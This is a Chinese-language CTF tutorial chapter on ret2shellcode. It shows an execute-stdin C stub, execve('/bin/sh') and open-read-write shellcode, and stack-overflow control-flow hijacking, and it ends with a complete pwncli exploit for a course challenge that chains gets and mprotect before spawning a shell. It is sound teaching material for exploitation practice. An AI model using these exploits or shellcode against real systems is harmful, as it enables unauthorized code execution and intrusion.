# 1.3.3 ret2shellcode

## 运行汇编程序

之前我们学习了汇编语法和简单的程序编写，但是我们还没学习如何编译运行。主流的环境有gas、nasm工具链，但是这里我们采用一些比较特殊的方式来运行。

## 编译运行脚本

建立我们的汇编指令文件`test.asm`

```assembly
push rbp
mov rbp,rsp
mov rax,1
push 0xa636261
mov rdi,1
mov rsi,rsp
mov rdx,4
syscall
leave
ret
```

调用`write(stdout,"abc\n",4)`在屏幕上打印一行abc

编写汇编脚本`asm.py`，将之转化为机器码

```python
from pwn import *
context.arch='amd64'
a=open('test.asm').read()
s=asm(a)
print(s)
open('test.bin','wb').write(s)
```

编写简易执行器`run.c`

```c
#include <stdio.h>
#include <string.h>
int main(){
    char a[300],*p=a,c;
    while(~(c=getchar())) *(p++)=c;
    ((void(*)())a)();
}
```

编译时记得加参数

```shell
gcc run.c -o run -z execstack
```

最后运行

```shell
python3 asm.py
./run < test.bin
```

结果和我们预期一样

```shell
$ ./run.out < test.org
abc

```

## 执行器的原理

看看我们最简单的代码执行器，前面是输入，最后一行其实是将输入的字符数组a强制转化为void型无参数的函数指针并调用。事实上，函数在内存中用函数代码段首地址来标识，换言之所谓函数指针也就是一个指向机器码地址，所以完全可以用一个字符指针来充当。要想正常运行，需要这个字符指针指向的数组内容每一比特正好是对应函数的机器码（表现起来是一堆乱码而非ASCII可打印字符）。

我们来看看这个程序的关键部分：

```c
((void(*)())a)();
```

编译为

```assembly
    11c6:       48 8d 95 c0 fe ff ff    lea    rdx,[rbp-0x140]
    11cd:       b8 00 00 00 00          mov    eax,0x0
    11d2:       ff d2                   call   rdx
```

第一行，将a的地址算好赋给rdx；第二行无关紧要；第三行直接callrdx，相当于把字符串a里的字节当成一串指令去运行。这就是强制转换成函数指针的原理。这是最简单的形式，因为函数有类型、有参数，不同形式的函数指针区别就在于编译时生成的传参数、返回值的指令片段不同，具体细节和编译原理有关，此处不深入。

## 思考和启发

事实上这里我们执行了最简单的shellcode。虽然没有破坏性，但如果我们执行`execve("/bin/sh",0,0)`,具体为如下代码段(run的stdin没切换，看不到效果，需要特殊处理)：

```assembly
push rbp
mov rbp,rsp
mov rax,59
push 0x6873
mov rdi,rsp
xor rsi,rsi
xor rdx,rdx
syscall
leave
ret

```

之前说过，二进制数据大体分数据、地址、指令这几类，这里事实上就是没有处理好**数据**和**指令**的隔离性，导致两者混淆了，产生了安全问题。

## 观察指令运行

这里我们使用pwndbg工具

## 实际运用的思考

假设如下一个情况：服务器开放了一个端口，服务器上一个含有漏洞的程序监听这个端口，这个程序可以输入任意一串字符串，并且这串字符串所在的段有执行权限。那么我们需要做的就是将程序的控制流劫持到这个字符串，具体来说，就是用各种手段将`rip`寄存器的值修改成这串字符串的首地址。这样，我们在字符串中构造好shellcode后程序就会执行我们需要运行的代码。

我们由浅入深思考一下需要解决的几个问题：

* 这串shellcode怎么构造？

  shellcode的构造方式有很多种，首先当然是顾名思义执行shell。

  因此我们之前写到的`execve('/bin/sh',NULL,NULL)`是一种选择，这里相当于执行`/bin/sh`程序，没有参数也没有其他环境变量。在amd64下，用syscall调用，调用号为59，只要将`rdi`指向`/bin/sh`字符串，`rsi`、`rdx`置0即可。后两个变量是二级字符指针，构造起来略微麻烦。

  同时，程序可能通过一些类似于`seccomp`的手段，禁止掉59号等比较危险的调用。我们无法直接写内核代码，因此我们需要一些其他的系统调用。这里比较常用的是`orw(open,read,write)`。

  `open`调用的功能是打开文件，创建`fd`文件描述符。`fd`我们在之前提到过，0、1、2这三个是系统保留的`stdin`、`stdout`、`stderr`，如果我们打开了其他文件，系统就会创建新的fd，序号从3开始计数。

  因此我们按顺序执行三个`syscall`

  `1.open("/path/to/flag",0)`

  `2.read(3,buf,len)`

  `3.write(1,buf,len)`

  第一个`syscall`的作用是打开`flag`文件，创建新的`fd`。一般情况下，`flag`文件和可执行程序在同一目录下，所以第一项一般直接用`flag`字符串就行。

  第二个`syscall`的作用相当于从fd里读取len长度的字节，到buf中去，相当于fscanf。如果程序是第一次打开文件，那么fd写入3就行。但是更精确地来说，open系统调用的返回值是打开的新fd，在函数返回后存在rax中，因此我们可以在第一次调用后将rax的值拿过来用。

  第三个`syscall`的作用相当于把buf开始len长度的字节写入到fd中去，如果fd等于1就打印到屏幕上。

  一般来说，buf的选取需要一段可以读写的数据段，我们常常选择bss段上的空闲空间。

* 用什么方式劫持`rip`？

  首先，最简单的方式当然是题目里面直接将字符串强制转换为函数指针并调用。一般这种情况多见于入门题，或者题目的考点本身不在这里（比如在shellcode上做文章）。

  其他情况下，我们需要用各种方式来劫持控制流，这本身是pwn里比较核心的一部分，这里介绍一种最简单的：栈溢出。

  我们知道，如果程序通过函数调用main或者其他函数执行，将会通过call指令进入函数，最后通过ret指令退出。call指令在栈上保存函数结束以后的返回地址，ret时读取这个地址并从那里开始执行。如果在函数中，我们可以在栈上写入一串长度超出限制的字符串，并且精确覆盖call指令存入的返回地址，将之修改成我们希望返回的地址，就可以实现控制流的劫持，这就是一种最简单的栈溢出。

* shellcode的内容是否有限制？

  这是shellcode题目的另一种考点。

  非常实际的问题：如果我们通过`gets(buf)`来输入，那么shellcode中就不能出现`'\n'`即`0x0a`，如果是`scanf("%s",buf)`则不能包含各种诸如空格、换行、`'\t'`等分隔符。如果是通过`read(1,buf,len)`，那么输入的shellcode长度不能超过len字节。

  更有甚者，出题者会自建函数来审核输入的字符串，比如必须要是ascii可打印字符、必须是字母数字、必须全是偶数字节等等各种奇怪的要求，这也是这类专门关注shellcode本身构造的pwn题的难度所在。

  幸好，各种常见的限制条件在网上都有了生成脚本，也有较为专门的套路去构造。

  

## 实践操作

### 例题 chp1-0-hellopwner-flag2

还记得我们在章节 1.0 中看到的例题 chp1-0-hellopwner 吗，我们使用了 ret2text 的方法拿到了 flag1，但是还没有成功实现 getshell，接下来考虑采用 ret2shellcode 的方法来拿到 shell：

```py
#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
#  set_remote_libc('libc.so.6')
context.arch = "amd64"

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def cmd(data):
    ru(b'cmd> ')
    sl(data)
def call_func(data, idx=0, key=b""):
    cmd(data)
    ru(b'offset: ')
    sl(i2b(idx))
    if data[:1] == b"1":
        ru(b'data: ')
        sl(key)

buf_addr = 0x4c5000 + 8
gets_addr = elf.symbols['gets']
mprotect_addr = elf.symbols['mprotect']
bytes_binsh = u64_ex(b"/bin/sh\x00")
call_func(b"0\x00".ljust(0xf8, b"\x00") + p64(buf_addr) + p64(gets_addr) + p64(mprotect_addr))
# -1 => shellcode
#  0 => gets
#  1 => mprotect

shellcode = b"a"*8
shellcode += asm(f"""
    // execve(b"/bin/sh\x00", 0, 0);
    mov rax, {bytes_binsh};
    push rax;
    mov rdi, rsp;
    xor rsi, rsi;
    xor rdx, rdx;
    push SYS_execve;
    pop rax;
    syscall;
""")
sl(shellcode)
call_func(i2b(1), 0x1000, b"a"*7)
call_func(i2b(-1))

ia()
```

---
